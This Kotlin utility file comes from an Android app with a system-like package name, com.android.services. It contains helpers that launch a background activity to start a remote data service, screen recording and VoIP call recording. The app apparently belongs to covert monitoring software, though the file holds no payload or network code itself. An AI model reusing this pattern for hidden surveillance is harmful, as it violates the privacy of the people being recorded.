package com.android.services.util

import android.content.Context
import android.content.Intent
import com.android.services.models.VoipCallRecord
import com.android.services.ui.activities.BackgroundServicesActivity

object ActivityUtil {

    fun startRemoteDataService(context: Context) {
        context.startActivityWithData<BackgroundServicesActivity>(
            listOf(
                Intent.FLAG_ACTIVITY_NEW_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TOP,
                Intent.FLAG_ACTIVITY_CLEAR_TASK
            ),
            Pair(
                BackgroundServicesActivity.EXTRA_TYPE,
                AppConstants.TYPE_REMOTE_DATA_SERVICE
            )
        )
    }

    fun startScreenRecordingService(mContext: Context, type: String, pkgName: String = "") {
        mContext.startActivityWithData<BackgroundServicesActivity>(
            listOf(
                Intent.FLAG_ACTIVITY_NEW_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TOP,
                Intent.FLAG_ACTIVITY_CLEAR_TASK,
            ),
            Pair(
                BackgroundServicesActivity.EXTRA_TYPE,
                type
            ),
            Pair(
                BackgroundServicesActivity.EXTRA_PACKAGE_NAME,
                pkgName
            )
        )
    }

    /**
     * @param mContext @link{android.content.Context}
     * This Launches the [BackgroundServicesActivity] to Start the Voip Call Record Service
     * [com.android.services.services.voip.VoipCallCommandService]
     */
    fun launchVoipCallRecordService(mContext: Context, voipCallRecord: VoipCallRecord) {
        mContext.startActivityWithData<BackgroundServicesActivity>(
            listOf(
                Intent.FLAG_ACTIVITY_NEW_TASK,
                Intent.FLAG_ACTIVITY_CLEAR_TOP,
                Intent.FLAG_ACTIVITY_CLEAR_TASK
            ),
            Pair(BackgroundServicesActivity.EXTRA_PARCELABLE_OBJECT, voipCallRecord),
            Pair(BackgroundServicesActivity.EXTRA_TYPE, AppConstants.VOIP_CALL_TYPE)
        )
    }
}